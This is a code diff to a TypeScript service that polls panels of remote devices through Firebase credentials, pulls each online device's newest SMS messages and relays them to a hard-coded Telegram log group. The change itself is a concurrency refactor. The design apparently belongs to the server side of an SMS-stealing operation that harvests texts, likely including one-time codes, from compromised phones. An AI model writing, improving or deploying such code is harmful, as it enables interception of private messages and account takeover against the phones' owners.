@@ -7,11 +7,21 @@ import { logger } from "./logger";
 const SMS_LOG_GROUP_ID = process.env.SMS_LOG_GROUP_ID || "-1002847599431";
 const SMS_LOG_GET_NUMBER_URL = process.env.SMS_LOG_GET_NUMBER_URL || "https://t.me/Annebellasmsbot?start=promo";
 const WATCH_INTERVAL_MS = 15000;
+const SEND_CONCURRENCY = 4;
 const inFlightSms = new Set<string>();
 let interval: NodeJS.Timeout | null = null;
 let running = false;
 let initialized = false;
 let storageReady = false;
+
+type Panel = typeof panelsTable.$inferSelect;
+type PendingSmsLog = {
+  key: string;
+  panelName: string;
+  panelId: number;
+  device: FirebaseDevice;
+  message: FirebaseSmsMessage;
+};
 
 const E = {
   sms: "5453900977432188793",
@@ -275,6 +285,57 @@ function formatSmsLog(panelName: string, device: FirebaseDevice, message: Fireba
   );
 }
 
+async function collectPanelSmsLogs(panel: Panel): Promise<PendingSmsLog[]> {
+  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
+  const onlineDevices = devices.filter((device) => device.status);
+
+  const perDevice = await Promise.all(
+    onlineDevices.map(async (device) => {
+      const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
+      const newest = messages.slice(0, 8);
+      const pending: PendingSmsLog[] = [];
+
+      for (const message of newest.reverse()) {
+        const key = smsKey(panel.id, device.id, message);
+        if (!initialized) {
+          await rememberExistingSms(key, panel.id, device.id, message);
+          continue;
+        }
+
+        const shouldLog = await reserveSmsForLogging(key, panel.id, device.id, message);
+        if (!shouldLog) continue;
+        pending.push({ key, panelName: panel.name, panelId: panel.id, device, message });
+      }
+
+      return pending;
+    })
+  );
+
+  return perDevice.flat();
+}
+
+async function sendPendingSmsLog(entry: PendingSmsLog): Promise<void> {
+  try {
+    await sendSmsLog(sc(formatSmsLog(entry.panelName, entry.device, entry.message)));
+    await markSmsSent(entry.key);
+  } catch (err) {
+    releaseSmsReservation(entry.key);
+    logger.warn({ err, panelId: entry.panelId, deviceId: entry.device.id }, "Failed to send SMS log");
+  }
+}
+
+async function sendPendingSmsLogs(entries: PendingSmsLog[]): Promise<void> {
+  let cursor = 0;
+  const workers = Array.from({ length: Math.min(SEND_CONCURRENCY, entries.length) }, async () => {
+    while (cursor < entries.length) {
+      const entry = entries[cursor++];
+      await sendPendingSmsLog(entry);
+      await new Promise((resolve) => setTimeout(resolve, 80));
+    }
+  });
+  await Promise.all(workers);
+}
+
 async function pollSmsLogs(): Promise<void> {
   if (running) return;
   const bot = getBot();
@@ -284,31 +345,9 @@ async function pollSmsLogs(): Promise<void> {
   try {
     await ensureSmsLogStorage();
     const panels = await db.select().from(panelsTable);
-    for (const panel of panels) {
-      const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
-      const onlineDevices = devices.filter((device) => device.status);
-      for (const device of onlineDevices) {
-        const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, device.id);
-        const newest = messages.slice(0, 8);
-        for (const message of newest.reverse()) {
-          const key = smsKey(panel.id, device.id, message);
-          if (!initialized) {
-            await rememberExistingSms(key, panel.id, device.id, message);
-            continue;
-          }
-          const shouldLog = await reserveSmsForLogging(key, panel.id, device.id, message);
-          if (!shouldLog) continue;
-          try {
-            await sendSmsLog(sc(formatSmsLog(panel.name, device, message)));
-            await markSmsSent(key);
-          } catch (err) {
-            releaseSmsReservation(key);
-            logger.warn({ err, panelId: panel.id, deviceId: device.id }, "Failed to send SMS log");
-          }
-          await new Promise((resolve) => setTimeout(resolve, 80));
-        }
-      }
-    }
+    const pending = (await Promise.all(panels.map((panel) => collectPanelSmsLogs(panel)))).flat();
+    pending.sort((a, b) => (a.message.timestampMs ?? 0) - (b.message.timestampMs ?? 0));
+    await sendPendingSmsLogs(pending);
     void trimSmsLogStorage().catch((err) => logger.warn({ err }, "Failed to trim SMS log dedupe table"));
     initialized = true;
   } catch (err) {
